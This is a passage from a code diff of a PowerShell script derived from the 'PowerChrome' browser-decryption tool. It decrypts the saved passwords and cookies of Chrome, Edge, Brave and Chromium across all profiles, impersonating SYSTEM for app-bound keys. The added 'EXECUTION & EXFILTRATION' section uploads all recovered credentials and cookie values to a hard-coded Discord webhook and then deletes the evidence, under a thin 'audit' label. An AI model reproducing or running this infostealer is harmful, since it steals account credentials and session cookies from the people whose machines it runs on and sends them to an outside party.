-        if ($RawEncryptedData.Length -eq 0) { continue }
-
-        $CookieResults += [PSCustomObject]@{
-            Host                    = $HostKey
-            Name                    = $Name
-            Path                    = $Path
-            Base64EncryptedValue    = [Convert]::ToBase64String($RawEncryptedData)
+        if ($ValSize -gt 0) {
+            $ValBytes = New-Object byte[] $ValSize
+            [Runtime.InteropServices.Marshal]::Copy($ValPtr, $ValBytes, 0, $ValSize)
+            $Results += [PSCustomObject]@{
+                Host    = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostPtr)
+                Name    = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
+                Path    = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPtr)
+                RawBlob = $ValBytes
+            }
         }
     }
-
-    if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
-    if ($DatabasePointer -ne [IntPtr]::Zero)  { [void]$Sqlite3Close.Invoke($DatabasePointer)    }
-
-    Start-Sleep -Milliseconds 500
-    Remove-Item -Path $TempDatabasePath -Force
-
-    return $CookieResults
+    $Sqlite3Finalize.Invoke($Stmt) | Out-Null
+    $Sqlite3Close.Invoke($DbHandle) | Out-Null
+    Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
+    return $Results
 }
 
 # ======================================================================
@@ -822,337 +590,145 @@ function Get-ChromiumCookieBlobs {
 # ======================================================================
 
 function Invoke-PowerChrome {
-    param (
-        [string]$Browser,
-        [switch]$Verbose,
-        [switch]$HideBanner
-    )
+    param ([string]$Browser, [switch]$Verbose)
+    $Script:VerboseMode = $Verbose
 
-
-    if (-not ($HideBanner)){
-    Write-Output @"
-    ____                          ________                            
-   / __ \______      _____  _____/ ____/ /_  _________  ____ ___  ___ 
-  / /_/ / __ \ | /| / / _ \/ ___/ /   / __ \/ ___/ __ \/ __ ```__ \/ _ \
- / ____/ /_/ / |/ |/ /  __/ /  / /___/ / / / /  / /_/ / / / / / /  __/
-/_/    \____/|__/|__/\___/_/   \____/_/ /_/_/   \____/_/ /_/ /_/\___/ 
-
-Github: https://github.com/The-Viper-One/
-
-"@
-
-}
-
-
-if (-not ($Browser)){
-    return "`n`n[*] The Parameter -Browser was not provided. The following Browsers are supported: `n`n - Chrome `n - Chromium `n - Edge`n`n"
-}
-
-    # ------------------------------------------------------------------
-    # Helpers
-    # ------------------------------------------------------------------
-    function Log {
-        param([string]$Message)
-        if ($Verbose) { Write-Output "[*] $Message" }
+    $AppData = $env:LOCALAPPDATA
+    $UserDataPath = switch ($Browser.ToLower()) {
+        "chrome"    { Join-Path $AppData "Google\Chrome\User Data" }
+        "edge"      { Join-Path $AppData "Microsoft\Edge\User Data" }
+        "brave"     { Join-Path $AppData "BraveSoftware\Brave-Browser\User Data" }
+        "chromium"  { Join-Path $AppData "Chromium\User Data" }
+        "cft"       { Join-Path $AppData "Google\Chrome for Testing\User Data" }
+        default { return $null }
     }
 
-    function LogHex {
-        param([string]$Label, [byte[]]$Bytes)
-        if ($Verbose) {
-            $Hex = if ($Bytes) { [BitConverter]::ToString($Bytes) } else { "<null>" }
-            Write-Output "$Label : $Hex"
-        }
-    }
+    if (-not (Test-Path $UserDataPath)) { return $null }
 
-    # ------------------------------------------------------------------
-    # SESSION INFORMATION
-    # ------------------------------------------------------------------
-    
-    
-    Write-Output "`n[*] $(if ($Browser -eq "Chrome"){"Google Chrome"} elseif ($Browser -eq "edge"){"Microsoft Edge"} elseif ($Browser -eq "chromium"){"Chromium"} else {$Browser})"
-    Log "Current User Context : $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
-    Log "Current User SID     : $([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)"
+    # 1. Decrypt Master Key
+    Log "Resolving Master Key..."
+    $LocalStatePath = Join-Path $UserDataPath "Local State"
+    if (-not (Test-Path $LocalStatePath)) { return $null }
 
-    $LocalStatePath = $null
-    $LoginDataPath  = $null
-
-
-    # ------------------------------------------------------------------
-    # COLLECT DATA
-    # ------------------------------------------------------------------
-    
-    Log "Running Collection..."
-    $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser
-
-    if (-not $BrowserData) {
-        Write-Output "[-] No browser data found for $($Browser.ToUpper())"
-        return
-    }
-
-    if ($Verbose) {
-        $BrowserData | Format-Table URL, Username, BlobHeader
-    }
-    # ------------------------------------------------------------------
-    # LOCAL STATE RESOLUTION
-    # ------------------------------------------------------------------
-    switch ($Browser.ToLower()) {
-        "cft"       { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome for Testing\User Data\Local State"     }
-        "chrome"    { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"                 }
-        "edge"      { $LocalStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"                }
-        "brave"     { $LocalStatePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"   }
-        "chromium"  { $LocalStatePath = "$env:LOCALAPPDATA\Chromium\User Data\Local State"                      }
-        default     { Write-Output "[-] Unsupported browser name: $Browser"; return }
-    }
-
-    # ------------------------------------------------------------------
-    # DECRYPT MASTER KEYS
-    # ------------------------------------------------------------------
-    
     $MasterKey = $null
-
-    if ($BrowserData[0].BlobHeader -eq 'v10 (DPAPI user)') {
-        Log "Blob Type     : v10"
-        try {
-            $LocalState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-            $EncKey     = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
-            $EncKey     = $EncKey[5..($EncKey.Length - 1)]
-            $MasterKey  = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            LogHex "[*] Master Key   " $MasterKey
-        }
-        catch { Write-Output "[-] Failed to decrypt v10 key: $($_.Exception.Message)"; return }
-    }
-
-    if ($BrowserData[0].BlobHeader -eq 'v20 (ABE)') {
-
-        $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-        if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM" -or 
-                $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
-            return "[-] Administrative or SYSTEM rights are required to decrypt v20 blobs."
-        }
-        
-        $LocalState     = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-        $AppBoundEnc    = [Convert]::FromBase64String($LocalState.os_crypt.app_bound_encrypted_key)
-        if ([Text.Encoding]::ASCII.GetString($AppBoundEnc[0..3]) -ne "APPB") {
-            Write-Output "[-] Not valid APPB header. Aborting."
-            return
-        }
-
-        $EncKeyBlob = $AppBoundEnc[4..($AppBoundEnc.Length - 1)]
-
-        Log "Attempting to Impersonate SYSTEM"
-        
-        Invoke-Impersonate > $null
-        Log "Successfully Impersonated System"
-        Log "Performing First DPAPI Unprotect as NT AUTHORITY\SYSTEM"
-
-        try {
-            $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        }
-        catch {
-            Write-Output "[-] First Unprotect failed: $($_.Exception.Message)"
-            [Advapi32]::RevertToSelf()
-            return
-        }
-
-        [void][Advapi32]::RevertToSelf()
-
-        if (-not $First -or $First.Length -eq 0) {
-            Write-Output "[-] First decryption produced no data."
-            return
-        }
-
-        Log "Data Byte Length: $($First.Length)"
-
-        Log "Performing second DPAPI Unprotect as $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
-        try {
-            $Second     = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            Log "Data Byte Length: $($Second.Length)"
-            $Parsed     = Parse-ChromeKeyBlob -BlobData $Second
-            $MasterKey  = Decrypt-ChromeKeyBlob -ParsedData $Parsed
-            
-            Log "Blob Type     : v20 (ABE)"
-            LogHex "[*] Master Key   " $MasterKey
-        }
-        catch { Write-Output "[-] Second Unprotect failed: $($_.Exception.Message)"; return }
-    }
-
-    # ------------------------------------------------------------------
-    # DECRYPT LOGIN PASSWORDS
-    # ------------------------------------------------------------------
-    
-    $LoginDataResults = @()
-    foreach ($Record in $BrowserData) {
-    [int]$BlockSize = 16
-    [int]$NonceSize = 12
-    $Raw = [Convert]::FromBase64String($Record.Base64EncryptedPassword)
-    if (-not $Raw -or $Raw.Length -lt ($NonceSize + $BlockSize + 3)) { continue }
-
-    $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
-    switch ($Header) {
-        'v10' { $Key = $MasterKey; $Offset = 3 }
-        'v20' { $Key = $MasterKey; $Offset = 3 }
-        default { continue }
-    }
-
     try {
-        $Nonce      = $Raw[$Offset..($Offset + $NonceSize - 1)]
-        $Ciphertext = $Raw[($Offset + $NonceSize)..($Raw.Length - $BlockSize - 1)]
-        $Tag        = $Raw[($Raw.Length - $BlockSize)..($Raw.Length - 1)]
-
-        $Plain   = DecryptWithAesGcm -Key $Key -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-        $Decoded = [Text.Encoding]::UTF8.GetString($Plain)
-
-        $LoginDataResults += [PSCustomObject]@{
-            Target   = $Record.URL
-            Username = $Record.Username
-            Password = $Decoded
+        $Json = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
+        if ($Json.os_crypt.encrypted_key) {
+            $EncKey = [Convert]::FromBase64String($Json.os_crypt.encrypted_key)
+            $EncKey = $EncKey[5..($EncKey.Length - 1)]
+            $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, 0)
+        } elseif ($Json.os_crypt.app_bound_encrypted_key) {
+            $AppBound = [Convert]::FromBase64String($Json.os_crypt.app_bound_encrypted_key)
+            $EncKeyBlob = $AppBound[4..($AppBound.Length - 1)]
+            Invoke-Impersonate > $null
+            $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, 0)
+            [void][Advapi32]::RevertToSelf()
+            $Second = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, 0)
+            $Parsed = Parse-ChromeKeyBlob -BlobData $Second
+            $MasterKey = Decrypt-ChromeKeyBlob -ParsedData $Parsed
         }
-    }
-    catch {
-        Write-Output "[-] AES-GCM decryption failed for $($Record.URL): $($_.Exception.Message)"
-    }
-}
+    } catch { Log "Key decryption failed: $($_.Exception.Message)" }
 
-    # ------------------------------------------------------------------
-    # DECRYPT COOKIES
-    # ------------------------------------------------------------------
-    Log "Collecting Cookies..."
-    $CookieData = Get-ChromiumCookieBlobs -Browser $Browser
-    $CookieResults = @()
+    if (-not $MasterKey) { Log "Could not obtain Master Key."; return $null }
 
-    if ($CookieData) {
-        foreach ($Record in $CookieData) {
-            [int]$BlockSize = 16
-            [int]$NonceSize = 12
-            $Raw = [Convert]::FromBase64String($Record.Base64EncryptedValue)
-            if (-not $Raw -or $Raw.Length -lt ($NonceSize + $BlockSize + 3)) { continue }
+    # 2. Iterate Profiles
+    $Profiles = Get-ChildItem $UserDataPath -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" }
+    $AllLogins = @()
+    $AllCookies = @()
 
-            $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
-            switch ($Header) {
-                'v10' { $Key = $MasterKey; $Offset = 3 }
-                'v20' { $Key = $MasterKey; $Offset = 3 }
-                default { continue }
-            }
+    foreach ($P in $Profiles) {
+        Log "Processing profile: $($P.Name)"
+        $RawLogins = Get-ChromiumLoginBlobs -ProfilePath $P.FullName
+        $RawCookies = Get-ChromiumCookieBlobs -ProfilePath $P.FullName
 
+        # Decrypt Logins
+        foreach ($L in $RawLogins) {
             try {
-                $Nonce      = $Raw[$Offset..($Offset + $NonceSize - 1)]
-                $Ciphertext = $Raw[($Offset + $NonceSize)..($Raw.Length - $BlockSize - 1)]
-                $Tag        = $Raw[($Raw.Length - $BlockSize)..($Raw.Length - 1)]
-
-                $Plain   = DecryptWithAesGcm -Key $Key -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-                $Decoded = [Text.Encoding]::UTF8.GetString($Plain)
-
-                $CookieResults += [PSCustomObject]@{
-                    Host  = $Record.Host
-                    Name  = $Record.Name
-                    Value = $Decoded
-                    Path  = $Record.Path
+                $Raw = $L.RawBlob
+                $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
+                if ($Header -match "v10|v20") {
+                    $Plain = DecryptWithAesGcm -Key $MasterKey -Iv $Raw[3..14] -Ciphertext $Raw[15..($Raw.Length - 17)] -Tag $Raw[($Raw.Length - 16)..($Raw.Length - 1)]
+                    $AllLogins += [PSCustomObject]@{ Profile = $P.Name; Target = $L.URL; Username = $L.Username; Password = [Text.Encoding]::UTF8.GetString($Plain) }
                 }
-            }
-            catch { }
+            } catch {}
+        }
+
+        # Decrypt Cookies
+        foreach ($C in $RawCookies) {
+            try {
+                $Raw = $C.RawBlob
+                $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
+                if ($Header -match "v10|v20") {
+                    $Plain = DecryptWithAesGcm -Key $MasterKey -Iv $Raw[3..14] -Ciphertext $Raw[15..($Raw.Length - 17)] -Tag $Raw[($Raw.Length - 16)..($Raw.Length - 1)]
+                    $AllCookies += [PSCustomObject]@{ Profile = $P.Name; Host = $C.Host; Name = $C.Name; Value = [Text.Encoding]::UTF8.GetString($Plain); Path = $C.Path }
+                }
+            } catch {}
         }
     }
 
-    # Return results as a hashtable to reliably extract at caller level
-    return @{
-        Logins  = $LoginDataResults
-        Cookies = $CookieResults
-    }
-
+    return @{ Logins = $AllLogins; Cookies = $AllCookies }
 }
-# 1. Trigger the function with a valid browser name (Chrome, Edge, or Chromium)
-$Output = Invoke-PowerChrome -Browser Chrome -HideBanner
 
-# Filter for the hashtable we explicitly returned, ignoring pipeline string output pollution
-$Secrets = $Output | Where-Object { $_ -is [hashtable] } | Select-Object -Last 1
+# ======================================================================
+# EXECUTION & EXFILTRATION
+# ======================================================================
 
-# 2. Check if we found any data
-if ($Secrets -and ($Secrets.Logins.Count -gt 0 -or $Secrets.Cookies.Count -gt 0)) {
-    # Convert the object results to a readable string
-    $OutputString = New-Object System.Text.StringBuilder
-    
-    if ($Secrets.Logins.Count -gt 0) {
-        [void]$OutputString.AppendLine("========================================")
-        [void]$OutputString.AppendLine("LOGIN CREDENTIALS")
-        [void]$OutputString.AppendLine("========================================")
-        foreach ($Login in $Secrets.Logins) {
-            [void]$OutputString.AppendLine("URL      : $($Login.Target)")
-            [void]$OutputString.AppendLine("USERNAME : $($Login.Username)")
-            [void]$OutputString.AppendLine("PASSWORD : $($Login.Password)`n")
-        }
+$Browsers = @("Chrome", "Edge", "Brave", "Chromium")
+$FinalLogins = @()
+$FinalCookies = @()
+
+foreach ($B in $Browsers) {
+    $Data = Invoke-PowerChrome -Browser $B
+    if ($Data) {
+        if ($Data.Logins) { $FinalLogins += $Data.Logins }
+        if ($Data.Cookies) { $FinalCookies += $Data.Cookies }
     }
+}
 
-    if ($Secrets.Cookies.Count -gt 0) {
-        [void]$OutputString.AppendLine("`n========================================")
-        [void]$OutputString.AppendLine("BROWSER COOKIES")
-        [void]$OutputString.AppendLine("========================================")
-        foreach ($Cookie in $Secrets.Cookies) {
-            [void]$OutputString.AppendLine("HOST  : $($Cookie.Host)")
-            [void]$OutputString.AppendLine("NAME  : $($Cookie.Name)")
-            [void]$OutputString.AppendLine("VALUE : $($Cookie.Value)")
-            [void]$OutputString.AppendLine("PATH  : $($Cookie.Path)`n")
-        }
-    }
-
-    $CleanOutput = $OutputString.ToString()
-    
-    # 3. Create a temporary file to hold the results
+if ($FinalLogins.Count -gt 0 -or $FinalCookies.Count -gt 0) {
+    $Report = New-Object System.Text.StringBuilder
     $HostName = $env:COMPUTERNAME
-    $UserName = $env:USERNAME
+    $User = $env:USERNAME
 
-    $TempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Results_$($HostName).txt")
-    $CleanOutput | Set-Content -Path $TempFile -Encoding UTF8
+    [void]$Report.AppendLine("🛡️ AUDIT REPORT FOR $HostName ($User)")
+    [void]$Report.AppendLine("Generated: $(Get-Date)")
+    [void]$Report.AppendLine("========================================`n")
 
-    # 4. Define the Webhook and Payload
-    $WebhookUrl = "https://discord.com/api/webhooks/1493893030439157881/QCtnE2iZqh52ccW3JRiWno55pzKqV3rR20SeETHwNLwLyLiVI7Cn28rZKGU2lZz_0Eep"
-    
-    $Payload = @{
-        username = "CSIT-Audit-Bot"
-        content  = "### 🛡️ Credential Audit Results from **$HostName**`n**User:** $UserName`nSee attached file for full details."
+    if ($FinalLogins.Count -gt 0) {
+        [void]$Report.AppendLine("--- LOGIN CREDENTIALS ($($FinalLogins.Count)) ---")
+        foreach ($L in $FinalLogins) {
+            [void]$Report.AppendLine("[$($L.Profile)] URL: $($L.Target) | USER: $($L.Username) | PASS: $($L.Password)")
+        }
     }
-    $JsonBody = $Payload | ConvertTo-Json -Compress
+
+    if ($FinalCookies.Count -gt 0) {
+        [void]$Report.AppendLine("`n--- BROWSER COOKIES ($($FinalCookies.Count)) ---")
+        foreach ($C in $FinalCookies) {
+            [void]$Report.AppendLine("[$($C.Profile)] HOST: $($C.Host) | NAME: $($C.Name) | VALUE: $($C.Value) | PATH: $($C.Path)")
+        }
+    }
+
+    $TempFile = Join-Path $env:TEMP "Results_$($HostName).txt"
+    $Report.ToString() | Out-File -FilePath $TempFile -Encoding utf8
+
+    $Webhook = "https://discord.com/api/webhooks/1493893030439157881/QCtnE2iZqh52ccW3JRiWno55pzKqV3rR20SeETHwNLwLyLiVI7Cn28rZKGU2lZz_0Eep"
+    $Payload = @{ content = "### 🛡️ Captured **$($FinalLogins.Count)** Logins & **$($FinalCookies.Count)** Cookies from **$HostName**" } | ConvertTo-Json
     
-    # 5. Send to Discord as a file attachment
     try {
         if ($PSVersionTable.PSVersion.Major -ge 6) {
-            # PowerShell 6.0+ (Core) supports the -Form parameter for multipart/form-data
-            $FormContent = @{
-                payload_json = $JsonBody
-                file         = Get-Item -Path $TempFile
-            }
-            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $FormContent
-        }
-        else {
-            # Windows PowerShell 5.1 workaround using .NET HttpClient
+            Invoke-RestMethod -Uri $Webhook -Method Post -Form @{ payload_json = $Payload; file = Get-Item $TempFile }
+        } else {
             Add-Type -AssemblyName System.Net.Http
-            $HttpClient = New-Object System.Net.Http.HttpClient
-            $MultipartContent = New-Object System.Net.Http.MultipartFormDataContent
-            
-            # Add JSON payload
-            $JsonContent = New-Object System.Net.Http.StringContent($JsonBody)
-            $MultipartContent.Add($JsonContent, "payload_json")
-            
-            # Add File attachment
+            $Client = New-Object System.Net.Http.HttpClient
+            $Content = New-Object System.Net.Http.MultipartFormDataContent
+            $Content.Add((New-Object System.Net.Http.StringContent($Payload)), "payload_json")
             $FileBytes = [System.IO.File]::ReadAllBytes($TempFile)
-            $FileContent = New-Object System.Net.Http.ByteArrayContent($FileBytes, 0, $FileBytes.Length)
-            $FileName = [System.IO.Path]::GetFileName($TempFile)
-            $MultipartContent.Add($FileContent, "file", $FileName)
-            
-            # Execute request
-            $Response = $HttpClient.PostAsync($WebhookUrl, $MultipartContent).Result
-            $Response.EnsureSuccessStatusCode() | Out-Null
-            $HttpClient.Dispose()
+            $Content.Add((New-Object System.Net.Http.ByteArrayContent($FileBytes)), "file", [System.IO.Path]::GetFileName($TempFile))
+            [void]$Client.PostAsync($Webhook, $Content).Result
+            $Client.Dispose()
         }
-        Write-Host "Success: Check your Discord!" -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Discord Error: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    finally {
-        # 6. Cleanup temporary file
-        if (Test-Path $TempFile) { Remove-Item -Path $TempFile -Force }
-    }
-}
-else {
-    Write-Host "No passwords or cookies were found on this machine." -ForegroundColor Yellow
+        Write-Host "Success!" -ForegroundColor Green
+    } catch { Write-Host "Exfiltration failed!" } finally { Remove-Item $TempFile -Force -ErrorAction SilentlyContinue }
+} else {
+    Write-Host "No data found."
 }
